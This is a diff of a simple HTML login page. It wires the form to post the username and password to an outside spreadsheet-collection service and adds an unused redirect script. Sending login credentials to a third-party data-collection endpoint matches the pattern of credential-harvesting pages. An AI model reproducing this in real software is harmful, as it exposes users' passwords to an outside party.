@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <link rel="stylesheet" href="style/form.css">
+
     <title>Login</title>
 </head>
 <body>
@@ -19,15 +20,24 @@
             Login
         </h1>
         <br>
-        <form>
+        <form method="post" action="https://api.sheetmonkey.io/form/tcHFBr7DmWo8rYXJqYhT82" target="_blank">
 
+          
             <label>User name</label>
-            <input type="text" placeholder="Enter username">
+            <input type="text" placeholder="Enter username" name="username">
 
             <label>Password</label>
-            <input type="text" placeholder="Enter password">
+            <input type="password" placeholder="Enter password" name="password">
 
-            <input type="submit" value="Register">
+            <input type="submit" onclick="" value="Login" id="submitBtn">
+          
+            <script>
+                function redirect(){
+                    window.location.href="index.html"
+                }
+            </script>
+       
+    
         </form>
     </center>
 </main>
